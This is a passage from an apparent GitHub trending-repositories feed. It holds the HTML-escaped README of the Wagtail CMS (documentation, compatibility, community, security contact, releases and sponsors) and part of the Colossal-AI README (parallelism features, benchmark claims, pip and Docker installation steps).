href=&#34;https://www.oxfam.org/en&#34;&gt;Oxfam&lt;/a&gt;, the &lt;a href=&#34;https://www.nhs.uk/&#34;&gt;NHS&lt;/a&gt;, &lt;a href=&#34;https://www.mozilla.org/en-US/&#34;&gt;Mozilla&lt;/a&gt;, &lt;a href=&#34;https://www.mit.edu/&#34;&gt;MIT&lt;/a&gt;, the &lt;a href=&#34;https://www.icrc.org/en&#34;&gt;Red Cross&lt;/a&gt;, &lt;a href=&#34;https://www.salesforce.com/&#34;&gt;Salesforce&lt;/a&gt;, &lt;a href=&#34;https://www.nbc.com/&#34;&gt;NBC&lt;/a&gt;, &lt;a href=&#34;https://www.bmw.com/en/index.html&#34;&gt;BMW&lt;/a&gt;, and the US and UK governments. Add your own Wagtail site to &lt;a href=&#34;https://madewithwagtail.org&#34;&gt;madewithwagtail.org&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;📖 Documentation&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.wagtail.org/&#34;&gt;docs.wagtail.org&lt;/a&gt; is the full reference for Wagtail, and includes guides for developers, designers and editors, alongside release notes and our roadmap.&lt;/p&gt; &#xA;&lt;p&gt;For those who are &lt;strong&gt;new to Wagtail&lt;/strong&gt;, the &lt;a href=&#34;https://docs.wagtail.org/en/stable/getting_started/the_zen_of_wagtail.html&#34;&gt;Zen of Wagtail&lt;/a&gt; will help you understand what Wagtail is, and what Wagtail is &lt;em&gt;not&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;For developers&lt;/strong&gt; who are ready to jump in to their first Wagtail website the &lt;a href=&#34;https://docs.wagtail.org/en/stable/getting_started/tutorial.html&#34;&gt;Getting Started Tutorial&lt;/a&gt; will guide you through creating and editing your first page.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Do you have an existing Django project?&lt;/strong&gt; The &lt;a href=&#34;https://docs.wagtail.org/en/stable/getting_started/integrating_into_django.html&#34;&gt;Wagtail Integration documentation&lt;/a&gt; is the best place to start.&lt;/p&gt; &#xA;&lt;h3&gt;📌 Compatibility&lt;/h3&gt; &#xA;&lt;p&gt;&lt;em&gt;(If you are reading this on GitHub, the details here may not be indicative of the current released version - please see &lt;a href=&#34;https://docs.wagtail.org/en/stable/releases/upgrading.html#compatible-django-python-versions&#34;&gt;Compatible Django / Python versions&lt;/a&gt; in the Wagtail documentation.)&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;Wagtail supports:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Django 3.2.x and 4.0.x&lt;/li&gt; &#xA; &lt;li&gt;Python 3.7, 3.8, 3.9 and 3.10&lt;/li&gt; &#xA; &lt;li&gt;PostgreSQL, MySQL and SQLite (with JSON1) as database backends&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.wagtail.org/en/stable/releases/upgrading.html#compatible-django-python-versions&#34;&gt;Previous versions of Wagtail&lt;/a&gt; additionally supported Python 2.7 and earlier Django versions.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;📢 Community Support&lt;/h3&gt; &#xA;&lt;p&gt;There is an active community of Wagtail users and developers responding to questions on &lt;a href=&#34;https://stackoverflow.com/questions/tagged/wagtail&#34;&gt;Stack Overflow&lt;/a&gt;. When posting questions, please read Stack Overflow&#39;s advice on &lt;a href=&#34;https://stackoverflow.com/help/how-to-ask&#34;&gt;how to ask questions&lt;/a&gt; and remember to tag your question &#34;wagtail&#34;.&lt;/p&gt; &#xA;&lt;p&gt;For topics and discussions that do not fit Stack Overflow&#39;s question and answer format we have a &lt;a href=&#34;https://github.com/wagtail/wagtail/wiki/Slack&#34;&gt;Slack workspace&lt;/a&gt;. Please respect the time and effort of volunteers by not asking the same question in multiple places.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/wagtail/wagtail/wiki/Slack&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wagtail/wagtail/main/.github/join-slack-community.png&#34; alt=&#34;Join slack community&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Our &lt;a href=&#34;https://github.com/wagtail/wagtail/discussions&#34;&gt;Github discussion boards&lt;/a&gt; are open for sharing ideas and plans for the Wagtail project.&lt;/p&gt; &#xA;&lt;p&gt;We maintain a curated list of third party packages, articles and other resources at &lt;a href=&#34;https://github.com/springload/awesome-wagtail&#34;&gt;Awesome Wagtail&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;🧑‍💼 Commercial Support&lt;/h3&gt; &#xA;&lt;p&gt;Wagtail is sponsored by &lt;a href=&#34;https://torchbox.com/&#34;&gt;Torchbox&lt;/a&gt;. If you need help implementing or hosting Wagtail, please contact us: &lt;a href=&#34;mailto:hello@torchbox.com&#34;&gt;hello@torchbox.com&lt;/a&gt;. See also &lt;a href=&#34;https://madewithwagtail.org/developers/&#34;&gt;madewithwagtail.org/developers/&lt;/a&gt; for expert Wagtail developers around the world.&lt;/p&gt; &#xA;&lt;h3&gt;🔐 Security&lt;/h3&gt; &#xA;&lt;p&gt;We take the security of Wagtail, and related packages we maintain, seriously. If you have found a security issue with any of our projects please email us at &lt;a href=&#34;mailto:security@wagtail.org&#34;&gt;security@wagtail.org&lt;/a&gt; so we can work together to find and patch the issue. We appreciate responsible disclosure with any security related issues, so please contact us first before creating a Github issue.&lt;/p&gt; &#xA;&lt;p&gt;If you want to send an encrypted email (optional), the public key ID for &lt;a href=&#34;mailto:security@wagtail.org&#34;&gt;security@wagtail.org&lt;/a&gt; is 0xbed227b4daf93ff9, and this public key is available from most commonly-used keyservers.&lt;/p&gt; &#xA;&lt;h3&gt;🕒 Release schedule&lt;/h3&gt; &#xA;&lt;p&gt;Feature releases of Wagtail are released every three months. Selected releases are designated as Long Term Support (LTS) releases, and will receive maintenance updates for an extended period to address any security and data-loss related issues. For dates of past and upcoming releases and support periods, see &lt;a href=&#34;https://github.com/wagtail/wagtail/wiki/Release-schedule&#34;&gt;Release Schedule&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;🕛 Nightly releases&lt;/h4&gt; &#xA;&lt;p&gt;To try out the latest features before a release, we also create builds from &lt;code&gt;main&lt;/code&gt; every night. You can find instructions on how to install the latest nightly release at &lt;a href=&#34;https://releases.wagtail.org/nightly/index.html&#34;&gt;https://releases.wagtail.org/nightly/index.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;🙋🏽 Contributing&lt;/h3&gt; &#xA;&lt;p&gt;If you&#39;re a Python or Django developer, fork the repo and get stuck in! We have several developer focused channels on the &lt;a href=&#34;https://github.com/wagtail/wagtail/wiki/Slack&#34;&gt;Slack workspace&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You might like to start by reviewing the &lt;a href=&#34;https://docs.wagtail.org/en/latest/contributing/index.html&#34;&gt;contributing guidelines&lt;/a&gt; and checking issues with the &lt;a href=&#34;https://github.com/wagtail/wagtail/labels/good%20first%20issue&#34;&gt;good first issue&lt;/a&gt; label.&lt;/p&gt; &#xA;&lt;p&gt;We also welcome translations for Wagtail&#39;s interface. Translation work should be submitted through &lt;a href=&#34;https://www.transifex.com/projects/p/wagtail/&#34;&gt;Transifex&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;🔓 License&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/wagtail/wagtail/raw/main/LICENSE&#34;&gt;BSD&lt;/a&gt; - Free to use and modify for any purpose, including both open and closed-source code.&lt;/p&gt; &#xA;&lt;h3&gt;👏 Thanks&lt;/h3&gt; &#xA;&lt;p&gt;We thank the following organisations for their services used in Wagtail&#39;s development:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.browserstack.com/&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/wagtail/wagtail@main/.github/browserstack-logo.svg?sanitize=true&#34; alt=&#34;Browserstack&#34;&gt;&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://www.browserstack.com/&#34;&gt;BrowserStack&lt;/a&gt; provides the project with free access to their live web-based browser testing tool, and automated Selenium cloud testing.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.squash.io/&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/wagtail/wagtail@main/.github/squash-logo.svg?sanitize=true&#34; alt=&#34;squash.io&#34;&gt;&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://www.squash.io/&#34;&gt;Squash&lt;/a&gt; provides the project with free test environments for reviewing pull requests.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://assistivlabs.com/&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/wagtail/wagtail@main/.github/assistivlabs-logo.png&#34; alt=&#34;Assistiv Labs&#34;&gt;&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://assistivlabs.com/&#34;&gt;Assistiv Labs&lt;/a&gt; provides the project with unlimited access to their remote testing with assistive technologies.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>hpcaitech/ColossalAI</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/hpcaitech/ColossalAI</id>
    <link href="https://github.com/hpcaitech/ColossalAI" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Colossal-AI: A Unified Deep Learning System for Big Model Era&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Colossal-AI&lt;/h1&gt; &#xA;&lt;div id=&#34;top&#34; align=&#34;center&#34;&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://www.colossalai.org/&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/Colossal-AI_logo.png&#34; alt=&#34;logo&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;Colossal-AI: A Unified Deep Learning System for Big Model Era&lt;/p&gt; &#xA; &lt;h3&gt; &lt;a href=&#34;https://arxiv.org/abs/2110.14883&#34;&gt; Paper &lt;/a&gt; | &lt;a href=&#34;https://www.colossalai.org/&#34;&gt; Documentation &lt;/a&gt; | &lt;a href=&#34;https://github.com/hpcaitech/ColossalAI-Examples&#34;&gt; Examples &lt;/a&gt; | &lt;a href=&#34;https://github.com/hpcaitech/ColossalAI/discussions&#34;&gt; Forum &lt;/a&gt; | &lt;a href=&#34;https://medium.com/@hpcaitech&#34;&gt; Blog &lt;/a&gt;&lt;/h3&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://github.com/hpcaitech/ColossalAI/actions/workflows/build.yml&#34;&gt;&lt;img src=&#34;https://github.com/hpcaitech/ColossalAI/actions/workflows/build.yml/badge.svg?sanitize=true&#34; alt=&#34;Build&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://colossalai.readthedocs.io/en/latest/?badge=latest&#34;&gt;&lt;img src=&#34;https://readthedocs.org/projects/colossalai/badge/?version=latest&#34; alt=&#34;Documentation&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.codefactor.io/repository/github/hpcaitech/colossalai&#34;&gt;&lt;img src=&#34;https://www.codefactor.io/repository/github/hpcaitech/colossalai/badge&#34; alt=&#34;CodeFactor&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://huggingface.co/hpcai-tech&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/%F0%9F%A4%97HuggingFace-Join-yellow&#34; alt=&#34;HuggingFace badge&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://join.slack.com/t/colossalaiworkspace/shared_invite/zt-z7b26eeb-CBp7jouvu~r0~lcFzX832w&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Slack-join-blueviolet?logo=slack&amp;amp;amp&#34; alt=&#34;slack badge&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/WeChat.png&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/%E5%BE%AE%E4%BF%A1-%E5%8A%A0%E5%85%A5-green?logo=wechat&amp;amp;amp&#34; alt=&#34;WeChat badge&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;| &lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/README.md&#34;&gt;English&lt;/a&gt; | &lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/README-zh-Hans.md&#34;&gt;中文&lt;/a&gt; |&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Why-Colossal-AI&#34;&gt;Why Colossal-AI&lt;/a&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Features&#34;&gt;Features&lt;/a&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Parallel-Training-Demo&#34;&gt;Parallel Training Demo&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#ViT&#34;&gt;ViT&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#GPT-3&#34;&gt;GPT-3&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#GPT-2&#34;&gt;GPT-2&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#BERT&#34;&gt;BERT&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#PaLM&#34;&gt;PaLM&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Single-GPU-Training-Demo&#34;&gt;Single GPU Training Demo&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#GPT-2-Single&#34;&gt;GPT-2&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#PaLM-Single&#34;&gt;PaLM&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Inference-Energon-AI-Demo&#34;&gt;Inference (Energon-AI) Demo&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#GPT-3-Inference&#34;&gt;GPT-3&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Installation&#34;&gt;Installation&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#PyPI&#34;&gt;PyPI&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Install-From-Source&#34;&gt;Install From Source&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Use-Docker&#34;&gt;Use Docker&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Community&#34;&gt;Community&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Quick-View&#34;&gt;Quick View&lt;/a&gt;&lt;/li&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Start-Distributed-Training-in-Lines&#34;&gt;Start Distributed Training in Lines&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Write-a-Simple-2D-Parallel-Model&#34;&gt;Write a Simple 2D Parallel Model&lt;/a&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#Cite-Us&#34;&gt;Cite Us&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Why Colossal-AI&lt;/h2&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://youtu.be/KnXSfjqkKN0&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/JamesDemmel_Colossal-AI.png&#34; width=&#34;600&#34;&gt; &lt;/a&gt; &#xA; &lt;p&gt;Prof. James Demmel (UC Berkeley): Colossal-AI makes distributed training efficient, easy and scalable.&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;p align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;p&gt;Colossal-AI provides a collection of parallel components for you. We aim to support you to write your distributed deep learning models just like how you write your model on your laptop. We provide user-friendly tools to kickstart distributed training and inference in a few lines.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Parallelism strategies&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Data Parallelism&lt;/li&gt; &#xA;   &lt;li&gt;Pipeline Parallelism&lt;/li&gt; &#xA;   &lt;li&gt;1D, &lt;a href=&#34;https://arxiv.org/abs/2104.05343&#34;&gt;2D&lt;/a&gt;, &lt;a href=&#34;https://arxiv.org/abs/2105.14500&#34;&gt;2.5D&lt;/a&gt;, &lt;a href=&#34;https://arxiv.org/abs/2105.14450&#34;&gt;3D&lt;/a&gt; Tensor Parallelism&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://arxiv.org/abs/2105.13120&#34;&gt;Sequence Parallelism&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://arxiv.org/abs/1910.02054&#34;&gt;Zero Redundancy Optimizer (ZeRO)&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Heterogeneous Memory Menagement&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://arxiv.org/abs/2108.05818&#34;&gt;PatrickStar&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Friendly Usage&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Parallelism based on configuration file&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Inference&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/hpcaitech/EnergonAI&#34;&gt;Energon-AI&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h2&gt;Parallel Training Demo&lt;/h2&gt; &#xA;&lt;h3&gt;ViT&lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/ViT.png&#34; width=&#34;450&#34;&gt; &lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;14x larger batch size, and 5x faster training for Tensor Parallelism = 64&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;GPT-3&lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/GPT3.png&#34; width=&#34;700/&#34;&gt; &lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Save 50% GPU resources, and 10.7% acceleration&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;GPT-2&lt;/h3&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/GPT2.png&#34; width=&#34;800/&#34;&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;11x lower GPU memory consumption, and superlinear scaling efficiency with Tensor Parallelism&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/(updated)GPT-2.png&#34; width=&#34;800&#34;&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;24x larger model size on the same hardware&lt;/li&gt; &#xA; &lt;li&gt;over 3x acceleration&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;BERT&lt;/h3&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/BERT.png&#34; width=&#34;800/&#34;&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;2x faster training, or 50% longer sequence length&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;PaLM&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hpcaitech/PaLM-colossalai&#34;&gt;PaLM-colossalai&lt;/a&gt;: Scalable implementation of Google&#39;s Pathways Language Model (&lt;a href=&#34;https://ai.googleblog.com/2022/04/pathways-language-model-palm-scaling-to.html&#34;&gt;PaLM&lt;/a&gt;).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please visit our &lt;a href=&#34;https://www.colossalai.org/&#34;&gt;documentation and tutorials&lt;/a&gt; for more details.&lt;/p&gt; &#xA;&lt;p align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h2&gt;Single GPU Training Demo&lt;/h2&gt; &#xA;&lt;h3&gt;GPT-2&lt;/h3&gt; &#xA;&lt;p id=&#34;GPT-2-Single&#34; align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/GPT2-GPU1.png&#34; width=&#34;450/&#34;&gt; &lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;20x larger model size on the same hardware&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;PaLM&lt;/h3&gt; &#xA;&lt;p id=&#34;PaLM-Single&#34; align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/PaLM-GPU1.png&#34; width=&#34;450/&#34;&gt; &lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;34x larger model size on the same hardware&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h2&gt;Inference (Energon-AI) Demo&lt;/h2&gt; &#xA;&lt;h3&gt;GPT-3&lt;/h3&gt; &#xA;&lt;p id=&#34;GPT-3-Inference&#34; align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/inference_GPT-3.jpg&#34; width=&#34;800/&#34;&gt; &lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hpcaitech/EnergonAI&#34;&gt;Energon-AI&lt;/a&gt;: 50% inference acceleration on the same hardware&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;h3&gt;Download From Official Releases&lt;/h3&gt; &#xA;&lt;p&gt;You can visit the &lt;a href=&#34;https://www.colossalai.org/download&#34;&gt;Download&lt;/a&gt; page to download Colossal-AI with pre-built CUDA extensions.&lt;/p&gt; &#xA;&lt;h3&gt;Download From Source&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;The version of Colossal-AI will be in line with the main branch of the repository. Feel free to raise an issue if you encounter any problem. :)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;git clone https://github.com/hpcaitech/ColossalAI.git&#xA;cd ColossalAI&#xA;&#xA;# install dependency&#xA;pip install -r requirements/requirements.txt&#xA;&#xA;# install colossalai&#xA;pip install .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you don&#39;t want to install and enable CUDA kernel fusion (compulsory installation when using fused optimizer):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;NO_CUDA_EXT=1 pip install .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h2&gt;Use Docker&lt;/h2&gt; &#xA;&lt;p&gt;Run the following command to build a docker image from Dockerfile provided.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Building Colossal-AI from scratch requires GPU support, you need to use Nvidia Docker Runtime as the default when doing &lt;code&gt;docker build&lt;/code&gt;. More details can be found &lt;a href=&#34;https://stackoverflow.com/questions/59691207/docker-build-with-nvidia-runtime&#34;&gt;here&lt;/a&gt;. We recommend you install Colossal-AI from our &lt;a href=&#34;https://www.colossalai.org&#34;&gt;project page&lt;/a&gt; directly.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd ColossalAI&#xA;docker build -t colossalai ./docker&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Run the following command to start the docker container in interactive mode.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;docker run -ti --gpus all --rm --ipc=host colossalai bash&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;p&gt;Join the Colossal-AI community on &lt;a href=&#34;https://github.com/hpcaitech/ColossalAI/discussions&#34;&gt;Forum&lt;/a&gt;, &lt;a href=&#34;https://join.slack.com/t/colossalaiworkspace/shared_invite/zt-z7b26eeb-CBp7jouvu~r0~lcFzX832w&#34;&gt;Slack&lt;/a&gt;, and &lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/WeChat.png&#34; title=&#34;qrcode&#34;&gt;WeChat&lt;/a&gt; to share your suggestions, feedback, and questions with our engineering team.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;If you wish to contribute to this project, please follow the guideline in &lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/CONTRIBUTING.md&#34;&gt;Contributing&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Thanks so much to all of our amazing contributors!&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/hpcaitech/ColossalAI/graphs/contributors&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/hpcaitech/public_assets/main/colossalai/img/contributor_avatar.png&#34; width=&#34;800px&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;The order of contributor avatars is randomly shuffled.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p 